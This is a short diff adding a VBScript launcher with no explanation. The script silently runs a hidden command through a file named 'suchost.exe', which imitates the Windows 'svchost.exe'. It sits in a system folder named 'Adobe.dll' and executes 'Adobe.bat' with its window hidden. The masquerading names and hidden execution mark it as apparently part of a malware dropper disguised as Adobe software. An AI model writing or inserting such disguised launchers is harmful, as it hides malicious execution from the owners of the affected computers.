@@ -1,0 +1,5 @@
+DIM objShell
+set objShell=wscript.createObject("wscript.shell")
+iReturn=objShell.Run("%windir%\system\Adobe.dll\suchost.exe /C %windir%\system\Adobe.dll\OSPUM.exe\Adobe.bat", 0, TRUE)
+
+ 
